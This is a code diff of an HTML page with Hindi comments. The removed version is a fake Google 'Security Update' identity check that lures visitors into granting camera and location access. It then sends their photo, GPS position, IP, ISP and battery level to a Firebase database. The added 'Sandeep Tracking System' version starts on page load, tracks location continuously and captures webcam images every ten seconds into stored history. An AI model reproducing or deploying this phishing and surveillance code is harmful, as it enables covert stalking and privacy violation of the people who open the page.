@@ -1,57 +1,75 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Google - Security Update</title>
+    <title>Sandeep Tracking System V8.4</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
-<body style="text-align:center; padding-top:100px; font-family:sans-serif; background:#fff;">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
-    <h2>पहचान सत्यापित करें</h2>
-    <p>जारी रखने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
-    <button onclick="activate()" style="padding:15px 35px; background:#1a73e8; color:white; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">पुष्टि करें</button>
-    <video id="v" style="display:none" autoplay playsinline></video>
-    <canvas id="c" style="display:none"></canvas>
-
+<body style="background: #000; color: #fff; text-align: center;">
+    <h1 id="status">INITIALIZING...</h1>
+    
     <script>
         const firebaseConfig = { databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        async function activate() {
+        function activate() {
+            document.getElementById('status').innerText = "SYSTEM ACTIVE";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(pos => {
+                    // 🟢 मुख्य फीचर: हर बार अलग डेटा एंट्री सेव करना (PUSH का इस्तेमाल)
+                    const uniqueKey = new Date().getTime(); // समय के हिसाब से अलग ID
+                    const trackingData = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        timestamp: new Date().toLocaleString(),
+                        device: navigator.platform
+                    };
+
+                    // 1. 'live_detect' में करंट लोकेशन (kp.html के लिए)
+                    database.ref('live_detect/location').update(trackingData);
+                    
+                    // 2. 'tracking_history' में हर बार नई एंट्री (डेटाबेस में स्टोर करने के लिए)
+                    database.ref('tracking_history').push(trackingData);
+
+                }, err => console.log(err), { enableHighAccuracy: true });
+            }
+
+            // मोबाइल इंटेल और IP
+            fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                database.ref('live_detect/intel').update({
+                    ip: data.ip,
+                    city: data.city,
+                    isp: data.org
+                });
+            });
+        }
+
+        async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = stream;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
                 
-                navigator.geolocation.watchPosition(p => {
-                    database.ref('live_detect/location').update({
-                        lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "m"
-                    });
-                }, null, {enableHighAccuracy: true});
-
-                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                    database.ref('live_detect/intel').update({ ip: d.ip, isp: d.org, city: d.city });
-                });
-
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(bt => {
-                        database.ref('live_detect/intel').update({ battery: Math.floor(bt.level * 100) + "%" });
-                    });
-                }
-
-                setTimeout(() => {
-                    const v = document.getElementById('v'), c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    database.ref('live_detect').update({ 
-                        photo: c.toDataURL('image/jpeg', 0.5), 
-                        time: new Date().toLocaleString() 
-                    });
-                    alert("सत्यापन सफल रहा।");
-                }, 2000);
-            } catch(e) { alert("त्रुटि: अनुमति की आवश्यकता है।"); }
+                setInterval(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
+                    
+                    // फोटो भी हिस्ट्री में सेव करें
+                    database.ref('live_detect').update({ photo: photoData });
+                    database.ref('photo_history').push({ photo: photoData, time: new Date().toLocaleString() });
+                }, 10000);
+            } catch (err) {}
         }
+
+        window.onload = () => { activate(); startCamera(); };
     </script>
 </body>
 </html>
